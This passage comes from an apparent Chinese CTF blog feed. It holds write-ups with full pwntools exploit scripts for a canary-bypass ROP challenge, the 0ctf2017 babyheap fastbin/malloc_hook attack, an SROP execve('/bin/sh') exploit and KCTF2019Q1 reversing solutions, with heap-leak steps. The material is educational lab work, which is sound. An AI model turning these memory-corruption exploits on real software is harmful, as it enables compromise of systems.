class="line">sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+&apos;\x20&apos;)</span><br><span class="line">sh.recvuntil(&quot;path:\n&quot;)</span><br><span class="line">sh.sendline(&quot;flag&quot;)</span><br><span class="line">sh.recvuntil(&quot;len:\n&quot;)</span><br><span class="line">sh.sendline(&quot;1000&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:\n&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(puts_got+base)+p64(puts_plt+base)+p64(main))</span><br><span class="line">sh.recvuntil(&quot;)\n&quot;)</span><br><span class="line">sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))</span><br><span class="line">puts=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(puts)</span><br><span class="line">sh.recvuntil(&quot;path:\n&quot;)</span><br><span class="line">sh.sendline(&quot;flag&quot;)</span><br><span class="line">sh.recvuntil(&quot;len:\n&quot;)</span><br><span class="line">sh.sendline(&quot;1000&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:\n&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base)+p64(read_got+base)+p64(puts_plt+base)+p64(main))</span><br><span class="line">sh.recvuntil(&quot;)\n&quot;)</span><br><span class="line">sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(pop_rdi+base))</span><br><span class="line">read=u64(sh.recv(6)+&quot;\x00\x00&quot;)</span><br><span class="line">print hex(read)</span><br><span class="line">libc=read-0x0f7250</span><br><span class="line">sh.recvuntil(&quot;path:\n&quot;)</span><br><span class="line">sh.sendline(&quot;flag&quot;)</span><br><span class="line">sh.recvuntil(&quot;len:\n&quot;)</span><br><span class="line">sh.sendline(&quot;1000&quot;)</span><br><span class="line">sh.recvuntil(&quot;note:\n&quot;)</span><br><span class="line">sh.sendline(&apos;a&apos;*600)</span><br><span class="line">sh.recvuntil(&quot;)\n&quot;)</span><br><span class="line">sh.send(&apos;a&apos;*600+p64(canary)+p64(1)+p64(0xf1147+libc))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0ctf2017-babyheap</title>
      <link href="/2019/03/27/0ctf2017-babyheap/"/>
      <url>/2019/03/27/0ctf2017-babyheap/</url>
      
        <content type="html"><![CDATA[<p>fastbin attack，比cgctf的note稍微难一点。</p><a id="more"></a><p>保护全开，思路和cgctf的note是一样的，当时做的时候因为找不到wp，就是对着这道题的wp做的。</p><p>当只有一个 <code>small/large chunk</code> 被释放时，<code>small/large chunk</code>的 <code>fd</code> 和 <code>bk</code> 指向 <code>main_arena</code> 中的地址。如果泄漏出这里<code>fd</code>或<code>bk</code>指向的地址，那么就可以得到libc基址。最后利用<code>malloc_hook</code>，可以执行onegadget，获取shell。</p><p>这道题比cgctf的note难的是，这道题不存在UAF，所以泄漏<code>main_arena</code>的地址变得稍微难了一点，但是利用<code>fastbinattack</code>还是可以做到的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10) #用来allocate(0x10) #实现allocate(0x10) #fastbin attackallocate(0x10) #用来修改下一个chunk的sizeallocate(0x80) #用来泄漏main_arenaallocate(0x80) #使上一个chunk free后能指向main_arenafree(1)free(2)fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\x80&quot;)fill(3,0x20,p64(0)*3+p64(0x21))allocate(0x10)allocate(0x10)fill(3,0x20,p64(0)*3+p64(0x91))free(4)dump(2)leak=sh.recv(8)libc_base=u64(leak)-0x3c4b20-88</span><br><span class="line">malloc_hook=libc_base+0x3c4b20-10</span><br></pre></td></tr></table></figure><p>这里通过修改第5个chunk的size，2次malloc第五个chunk，index2和index4指向的都是第五个chunk，free4之后dump2就能打印出<code>main_arena+88</code>地址，从而泄漏libc基址。</p><p>关于<code>main_arena</code>在libc中的偏移，可以使用ida打开libc文件，在<code>malloc_trim</code>函数中找到。</p><p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1ht6an0thj30ug0bqgo4.jpg" alt></p><p>在调用malloc函数时，程序会对<code>malloc_hook</code>进行检查，如果不为0，就会调用<code>malloc_hook</code>指向的函数，借此调用onegadget。fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。修改掉最后并进fastbin中的chunk的fd指针，使其指向<code>malloc_hook</code>，这样之后第二次malloc出的chunk就会出现在<code>malloc_hook</code>。但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要进行偏移构造。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1huobqblqj311207o0wv.jpg" alt></p><p>可以看到偏移-20-0x3的时候<code>malloc_hook</code>上方就构造出了一个size为0x7f的chunk。</p><p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g1htpxbbwdj30us0di40w.jpg" alt></p><p>找到的<code>onegadget</code>，尝试发现<code>0x4526a</code>的可以用。</p><p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1humj3kmrj30xm07mjvk.jpg" alt></p><p>经过尝试，填充大小为19时可以覆盖到<code>malloc_hook</code></p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*- # from pwn import *def allocate(Size):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;1&quot;)sh.recvuntil(&quot;Size: &quot;)sh.sendline(str(int(Size)))def fill(Index,Size,Content):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;2&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))sh.recvuntil(&quot;Size: &quot;)sh.sendline(str(int(Size)))sh.recvuntil(&quot;Content: &quot;)sh.send(Content)def free(Index):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;3&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))def dump(Index):sh.recvuntil(&quot;Command: &quot;)sh.sendline(&quot;4&quot;)sh.recvuntil(&quot;Index: &quot;)sh.sendline(str(Index))elf = ELF(&apos;./libc.so.6&apos;)sh = process(&apos;./heap-2&apos;)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x80)allocate(0x80)free(1)free(2)fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\x80&quot;)fill(3,0x20,p64(0)*3+p64(0x21))allocate(0x10)allocate(0x10)fill(3,0x20,p64(0)*3+p64(0x91))free(4)dump(2)leak=sh.recvuntil(&quot;\x00\x00&quot;)[-8:]libc_base=u64(leak)-0x3c4b78malloc_hook=libc_base+0x3c4b20-0x10print hex(malloc_hook)allocate(0x60)free(4)fill(2,8,p64(malloc_hook-0x20-0x3))allocate(0x60)allocate(0x60)fill(6,0x1b,p64(0)*2+&quot;\x00\x00\x00&quot;+p64(libc_base+0x4526a))allocate(0x1)sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g1hutuwtkmj30li0cuq4n.jpg" alt></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>栈-SROP</title>
      <link href="/2019/03/26/%E6%A0%88-SROP/"/>
      <url>/2019/03/26/%E6%A0%88-SROP/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop/#srop" target="_blank" rel="noopener">CTFWIKI-SROP</a></p><a id="more"></a><p>例题是ichunqiu的一道pwn-smallest。</p><p>IDA打开，只有几行汇编，题如其名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">xor     rax, rax</span><br><span class="line">mov     edx, 400h</span><br><span class="line">mov     rsi, rsp</span><br><span class="line">mov     rdi, rax</span><br><span class="line">syscall</span><br><span class="line">retn</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure><p>调用syscall之前，<code>rax=0</code>，<code>rdi=0</code>，<code>rsi=rsp</code>，<code>edx=0x400</code></p><p>可知执行的是0号syscall，即<code>read(0,$rsp,400)</code>，产生了栈溢出</p><p>同时read函数读取的字节数会返回到rax中，如果跳过执行<code>xor     rax, rax</code>就可以利用这一点设置rax的值执行想要的syscall。</p><p>最后retn会使得<code>rip=[rsp]</code> <code>rsp=rsp+8</code>。</p><p>exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*- # from pwn import *elf = ELF(&apos;./stack-5.&apos;)sh = process(&apos;./stack-5.&apos;)context.arch = &apos;amd64&apos;syscall_addr = 0x4000bestart_addr = 0x4000b0payload = &quot;&quot;payload += p64(start_addr)*3              sh.send(payload)#返回到start，因为之后要通过read返回值修改rax，所以先把之后的返回地址也布置好sleep(3)sh.send(&apos;\xb3&apos;)#修改返回地址为0x4000b3，跳过xor，rax的值为1#执行write(1，rsp，0x400)stack_addr = u64(sh.recv()[8:16])print &apos;stack addr :&apos;+str(hex(stack_addr))#接收rsp地址sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)#read(0,stack_addr_,0x400)sh.send(payload)#修改signal Frame，返回到startsigreturn = p64(syscall_addr) + &apos;\x00&apos; * 7#rax=15，执行sigreturnsh.send(sigreturn)#返回到syscallsigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = stack_addr + 0x120 #/bin/sh存放地址 sigframe.rsi = 0x0sigframe.rdx = 0x0sigframe.rsp = stack_addrsigframe.rip = syscall_addrframe_payload = p64(start_addr) + &apos;a&apos; * 8 + str(sigframe)#execve(&apos;/bin/sh&apos;,0,0)payload = frame_payload + (0x120 - len(frame_payload)) * &apos;\x00&apos; + &apos;/bin/sh\x00&apos;#把/bin/sh读到rsp+0x120sh.send(payload)#修改signal Frame，返回到startsh.send(sigreturn)#执行sigreturnsh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF2019Q1</title>
      <link href="/2019/03/26/KCTF2019Q1/"/>
      <url>/2019/03/26/KCTF2019Q1/</url>
      
        <content type="html"><![CDATA[<p>好菜，这次必看着dalao的wp学习一波。</p><a id="more"></a><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">s=&quot;KanXueCTF2019JustForhappy&quot;</span><br><span class="line">dic=&quot;abcdefghiABCDEFGHIJKLMNjklmn0123456789opqrstuvwxyzOPQRSTUVWXYZ&quot;</span><br><span class="line">index=[]</span><br><span class="line">key=&quot;&quot;</span><br><span class="line">for i in s:</span><br><span class="line">index.append(dic.find(i))</span><br><span class="line">for i in index:</span><br><span class="line">if i&gt;=0 and i&lt;=9:</span><br><span class="line">key+=chr(i+48)</span><br><span class="line">if i&gt;=10 and i&lt;=35:</span><br><span class="line">key+=chr(i+87)</span><br><span class="line">if i&gt;=36:</span><br><span class="line">key+=chr(i+29)</span><br><span class="line">print key</span><br></pre></td></tr></table></figure><h1 id="初入好望角"><a href="#初入好望角" class="headerlink" title="初入好望角"></a>初入好望角</h1><p>魔改了一波源代码就可以解密了，毕竟key和iv都给了，不过之前没怎么用代码实现过AES加密，所以选择了魔改源代码，看了dalao们的wp，使用py应该可以代码更简洁一些。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">namespace HelloWorldApplication</span><br><span class="line">&#123;</span><br><span class="line">   class HelloWorld</span><br><span class="line">   &#123;</span><br><span class="line">      static void Main(string[] args)</span><br><span class="line">      &#123;</span><br><span class="line">         byte[] keyArray = new PasswordDeriveBytes(&quot;Kanxue2019&quot;, null).GetBytes(32);</span><br><span class="line">            byte[] ivArray = Encoding.UTF8.GetBytes(&quot;Kanxue2019CTF-Q1&quot;);</span><br><span class="line">            byte[] toEncryptArray = Convert.FromBase64String(&quot;4RTlF9Ca2+oqExJwx68FiA==&quot;);</span><br><span class="line">            RijndaelManaged rDel = new RijndaelManaged();</span><br><span class="line">            rDel.Key = keyArray;</span><br><span class="line">            rDel.IV = ivArray;</span><br><span class="line">            rDel.Mode = CipherMode.CBC;</span><br><span class="line">            rDel.Padding = PaddingMode.Zeros;</span><br><span class="line">            ICryptoTransform cTransform = rDel.CreateDecryptor();</span><br><span class="line">            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);</span><br><span class="line">            Console.WriteLine(UTF8Encoding.UTF8.GetString(resultArray));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="REPWN"><a href="#REPWN" class="headerlink" title="REPWN"></a>REPWN</h1><p>这题当时做的时候完全没意识到栈溢出，所以只做出来前面一半，明明名字给了提示了2333</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1g1w9edzg8lj30ke0gu0u2.jpg" alt></p><p>这里会对输入进行检验，要求从第9位开始是X1Y0uN3tG00d，第21位是H。</p><p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1g1w9hktvsnj30e60eq0tz.jpg" alt></p><p>这个函数就是栈溢出所在，strcpy时可以覆盖到返回地址，改变程序进程。<code>sub_4013b0</code>限制了输入的前8位，简单的方程组求解，答案是20101001。</p><p>由于之前已经限制了第21位输入是<code>H</code>，所以可以知道跳转到的地址的最后两位是<code>f0</code>。由于程序的地址只有六位，所以开头两位必定是<code>00</code>，可以推出第二十四位输入是<code>k</code>。</p><p>在IDA里发现<code>0x401bf0</code>处的代码是红色的，没有被识别为函数，这里手动创建一下函数，发现这个函数应该就是需要跳转到的地址，输入应为<code>HaCk</code>。</p><p>输入<code>20101001X1Y0uN3tG00dHaCk</code>后程序情况<br><img src="https://ws2.sinaimg.cn/large/006tNc79gy1g1w9x0dejsj30e6068wfp.jpg" alt></p><p>分析<code>sub_401bf0</code>，发现对输入进行des加密，key为<code>XiyouNet</code>，得到第二部分输入<code>Wel1C0me</code>。</p><p>当时没看出栈溢出，但是发现了函数<code>sub_401bf0</code>，只知道最终答案格式是第一次输入加第二次输入，可惜没能分析出des，也不知道怎么样能进行第二次输入，属实鶸。</p><h1 id="影分身之术"><a href="#影分身之术" class="headerlink" title="影分身之术"></a>影分身之术</h1><p>这一题当时甚至还找了出题人去年出的题的wp，结果也是只做出了一半233</p><p>首先有一段js混淆，解密后代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function ckpswd() &#123;</span><br><span class="line">    key = &quot;simpower91&quot;;</span><br><span class="line">    a = document.all.pswd.value;</span><br><span class="line">    if (a.indexOf(key) == 0) &#123;</span><br><span class="line">        l = a.length;</span><br><span class="line">        i = key.length;</span><br><span class="line">        sptWBCallback(a.substring(i, l));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        alert(&quot;wrong!&lt;&quot; + a + &quot;&gt; is not my GUID ;-)&quot;);</span><br><span class="line">        return &quot;1234&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function ok() &#123;</span><br><span class="line">    alert(&quot;congratulations!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的key的前缀必须是simpower91，之后的字符会作为sptWBCallback的参数，猜测是调用ok函数，不过上网找了半天也不知道怎么样的字符能调用到ok函数…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function sptWBCallback(spt_wb_id,spt_wb_name,optionstr)&#123;</span><br><span class="line">    url=&apos;#sptWBCallback:id=&apos;;</span><br><span class="line">    url=url+spt_wb_id+&apos;;eventName=&apos;+spt_wb_name;</span><br><span class="line">    if(optionstr)         </span><br><span class="line">        url=url+&apos;;params=optionstr&apos;;</span><br><span class="line">    location=url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（看了wp之后）跟踪发现这里有一个cmp eax,0x4的操作，simpower91后输入的字符长度为4。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00493FA6   .  55            push ebp00493FA7   .  68 BA414900   push crackme2.004941BA00493FAC   .  64:FF30       push dword ptr fs:[eax]00493FAF   .  64:8920       mov dword ptr fs:[eax],esp00493FB2   .  8B45 EC       mov eax,dword ptr ss:[ebp-0x14]00493FB5   .  E8 7A07F7FF   call crackme2.0040473400493FBA   .  83F8 04       cmp eax,0x400493FBD   .  0F85 BE010000 jnz crackme2.0049418100493FC3   .  EB 21         jmp short crackme2.00493FE600493FC5   .^ E0 B0         loopdne short crackme2.00493F7700493FC7   .  B1 B2         mov cl,0xB2</span><br><span class="line">```</span><br><span class="line">一路跟踪跟进了虚拟机函数，对四个字符的验证为</span><br><span class="line">`ord(i)+0x7f==[0xe0, 0xb0, 0xb1, 0xb2]`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后四个字符为`a123`</span><br><span class="line"></span><br><span class="line"># SaveSingleDog</span><br><span class="line"></span><br><span class="line">听完人人人师傅的讲解豁然开朗，这题属于类型混淆，关键在于利用singledog和luckydog的不同结构及操作。</span><br><span class="line"></span><br><span class="line">main函数：</span><br></pre></td></tr></table></figure><p>puts(“This is a little game\n”);<br>  puts(“You can create a character and choose if he needs a partner.\n”);<br>  while ( 1 )<br>  {<br>    menu(“You can create a character and choose if he needs a partner.\n”, argv);<br>    read_int();<br>    switch ( (unsigned int)&amp;savedregs )<br>    {<br>      case 1u:<br>        singledog();<br>        break;<br>      case 2u:<br>        luckydog();<br>        break;<br>      case 3u:<br>        edit_singledog();<br>        break;<br>      case 4u:<br>        edit_luckydog();<br>        break;<br>      case 5u:<br>        save_singledog();<br>        break;<br>      case 6u:<br>        exit(1);<br>        return;<br>      default:<br>        continue;<br>    }<br>  }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">常见的menu，有五个功能可以选择。</span><br><span class="line"></span><br><span class="line">其中，singledog():</span><br></pre></td></tr></table></figure></p><p>  v3 = <strong>readfsqword(0x28u);<br>  v2 = single_num;<br>  if ( single_num == 80 )<br>  {<br>    puts(“full”);<br>  }<br>  else<br>  {<br>    printf(“Number :%d\n”, (unsigned int)single_num);<br>    buf = malloc(0x20uLL);<br>    puts(“Name:”);<br>    read(0, buf, 0x20uLL);<br>    two[v2] = buf;<br>    ++single_num;<br>  }<br>  return </strong>readfsqword(0x28u) ^ v3;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">luckydog:</span><br></pre></td></tr></table></figure></p><p>  v4 = <strong>readfsqword(0x28u);<br>  v3 = lucky_num;<br>  if ( lucky_num == 80 )<br>  {<br>    puts(“full”);<br>  }<br>  else<br>  {<br>    printf(“Number :%d\n”, (unsigned int)lucky_num);<br>    v0 = malloc(0x20uLL);<br>    buf = malloc(0x20uLL);<br>    *v0 = buf;<br>    puts(“Name”);<br>    read(0, v0 + 1, 0x18uLL);<br>    puts(“your partner’s name”);<br>    read(0, buf, 0x20uLL);<br>    one[v3] = v0;<br>    ++lucky_num;<br>  }<br>  return </strong>readfsqword(0x28u) ^ v4;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以对比两个dog之间的不同，singledog中的two存放的是一级指针，指向的地址存放着0x20长度的name，而luckydog中的one存放的是二级指针v0,v0指向的是buf的地址，buf指向的是partner&apos;s name，同时还有一个0x18长度的name，结构可以表示为：</span><br></pre></td></tr></table></figure></p><p>singledog:</p><pre><code>two[v2]: buf --&gt; name</code></pre><p>luckydog:</p><pre><code>one[v3]:  v0 --&gt; buf --&gt; name          v0+1 --&gt; partner&apos;s name</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf占0x20的空间，v0占0x8的空间，v0+1占0x18的空间。</span><br><span class="line"></span><br><span class="line">在edit时，没有对one或two的越界检查，而且在one和two的存放方式如下：</span><br></pre></td></tr></table></figure><p>.data:0000000000202008                 public <strong>dso_handle<br>.data:0000000000202008 </strong>dso_handle    dq offset <strong>dso_handle  ; DATA XREF: </strong>do_global_dtors_aux+17↑r<br>.data:0000000000202008                                         ; .data:<strong>dso_handle↓o<br>.data:0000000000202008 _data           ends<br>.data:0000000000202008<br>LOAD:0000000000202010 ; ===========================================================================<br>LOAD:0000000000202010<br>LOAD:0000000000202010 ; Segment type: Pure data<br>LOAD:0000000000202010 ; Segment permissions: Read/Write<br>LOAD:0000000000202010 LOAD            segment byte public ‘DATA’ use64<br>LOAD:0000000000202010                 assume cs:LOAD<br>LOAD:0000000000202010                 ;org 202010h<br>LOAD:0000000000202010                 public </strong>bss_start<br>LOAD:0000000000202010 <strong>bss_start     db    ? ;               ; DATA XREF: deregister_tm_clones↑o<br>LOAD:0000000000202010                                         ; register_tm_clones↑o …<br>LOAD:0000000000202010                                         ; Alternative name is ‘_edata’<br>LOAD:0000000000202010                                         ; </strong>TMC_END__<br>LOAD:0000000000202010                                         ; _edata<br>LOAD:0000000000202011                 db    ? ;<br>LOAD:0000000000202012                 db    ? ;<br>LOAD:0000000000202013                 db    ? ;<br>LOAD:0000000000202014                 db    ? ;<br>LOAD:0000000000202015                 db    ? ;<br>LOAD:0000000000202016                 db    ? ;<br>LOAD:0000000000202017 unk_202017      db    ? ;               ; DATA XREF: deregister_tm_clones+7↑o<br>LOAD:0000000000202018                 db    ? ;<br>LOAD:0000000000202019                 db    ? ;<br>LOAD:000000000020201A                 db    ? ;<br>LOAD:000000000020201B                 db    ? ;<br>LOAD:000000000020201C                 db    ? ;<br>LOAD:000000000020201D                 db    ? ;<br>LOAD:000000000020201E                 db    ? ;<br>LOAD:000000000020201F                 db    ? ;<br>LOAD:000000000020201F LOAD            ends<br>LOAD:000000000020201F<br>.bss:0000000000202020 ; ===========================================================================<br>.bss:0000000000202020<br>.bss:0000000000202020 ; Segment type: Uninitialized<br>.bss:0000000000202020 ; Segment permissions: Read/Write<br>.bss:0000000000202020 ; Segment alignment ‘32byte’ can not be represented in assembly<br>.bss:0000000000202020 _bss            segment para public ‘BSS’ use64<br>.bss:0000000000202020                 assume cs:_bss<br>.bss:0000000000202020                 ;org 202020h<br>.bss:0000000000202020                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing<br>.bss:0000000000202020                 public stdout@@GLIBC_2_2_5<br>.bss:0000000000202020 ; FILE <em>stdout<br>.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:0000000000000490↑o<br>.bss:0000000000202020                                         ; my_init+54↑r<br>.bss:0000000000202020                                         ; Alternative name is ‘stdout’<br>.bss:0000000000202020                                         ; Copy of shared data<br>.bss:0000000000202028                 align 10h<br>.bss:0000000000202030                 public stdin@@GLIBC_2_2_5<br>.bss:0000000000202030 ; FILE </em>stdin<br>.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:00000000000004A8↑o<br>.bss:0000000000202030                                         ; my_init+36↑r<br>.bss:0000000000202030                                         ; Alternative name is ‘stdin’<br>.bss:0000000000202030                                         ; Copy of shared data<br>.bss:0000000000202038                 align 20h<br>.bss:0000000000202040                 public stderr@@GLIBC_2_2_5<br>.bss:0000000000202040 ; FILE *stderr<br>.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ?                ; DATA XREF: LOAD:00000000000004C0↑o<br>.bss:0000000000202040                                         ; my_init+72↑r<br>.bss:0000000000202040                                         ; Alternative name is ‘stderr’<br>.bss:0000000000202040                                         ; Copy of shared data<br>.bss:0000000000202048 completed_6962  db ?                    ; DATA XREF: <strong>do_global_dtors_aux↑r<br>.bss:0000000000202048                                         ; </strong>do_global_dtors_aux+29↑w<br>.bss:0000000000202049                 align 4<br>.bss:000000000020204C                 public single_num<br>.bss:000000000020204C single_num      dd ?                    ; DATA XREF: singledog+17↑r<br>.bss:000000000020204C                                         ; singledog+9B↑r …<br>.bss:0000000000202050                 public lucky_num<br>.bss:0000000000202050 lucky_num       dd ?                    ; DATA XREF: luckydog+17↑r<br>.bss:0000000000202050                                         ; luckydog+E2↑r …<br>.bss:0000000000202054                 align 20h<br>.bss:0000000000202060                 public two<br>.bss:0000000000202060 ; _QWORD two[80]<br>.bss:0000000000202060 two             dq 50h dup(?)           ; DATA XREF: singledog+8C↑o<br>.bss:0000000000202060                                         ; edit_singledog+3D↑o …<br>.bss:00000000002022E0                 public one<br>.bss:00000000002022E0 ; _QWORD one[80]<br>.bss:00000000002022E0 one             dq 50h dup(?)           ; DATA XREF: luckydog+D3↑o<br>.bss:00000000002022E0                                         ; edit_luckydog+3D↑o …<br>.bss:00000000002022E0 _bss            ends<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">因此在`edit_singledog`时，可以利用越界的下标，把luckydog当做singledog进行edit。</span><br><span class="line"></span><br><span class="line">edit_singledog：</span><br></pre></td></tr></table></figure></p><p>  v2 = <strong>readfsqword(0x28u);<br>  puts(“which?”);<br>  v1 = read_int(“which?”);<br>  if ( two[v1] )<br>  {<br>    puts(“Oh,singledog,changing your name can bring you good luck.”);<br>    read(0, (void *)two[v1], 0x20uLL);<br>    printf(“new name: %s”, two[v1]);<br>  }<br>  else<br>  {<br>    puts(“nothing here”);<br>  }<br>  return </strong>readfsqword(0x28u) ^ v2;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">由于之前的结构差异，此时会输出的是buf的地址，即之前申请的堆地址，但是最低的一个字节是被我们edit过的，但是因为取的是堆基址，所以无关紧要。堆地址是页对齐的，一页的大小为4k，所以`&amp;0xfffffffff000`取堆的基地址。</span><br></pre></td></tr></table></figure></p><p>edit_single((0x2e0-0x60)/8,”\x00”)<br>io.recvuntil(“new name: “)<br>heap_base = (u64(io.recv(6).ljust(8,’\x00’))&amp;0xfffffffff000)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类似地，可以使用负数作为下标，leak出`__dso_handle`的值，同时`__dso_handle`的值就是它的地址，所以可以得到程序的基地址。</span><br></pre></td></tr></table></figure></p><p>edit_single((0x08-0x60)/8,”\x08”)<br>io.recvuntil(“new name: “)<br>proc_base = (u64(io.recv(6).ljust(8,’\x00’))-0x202008)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span 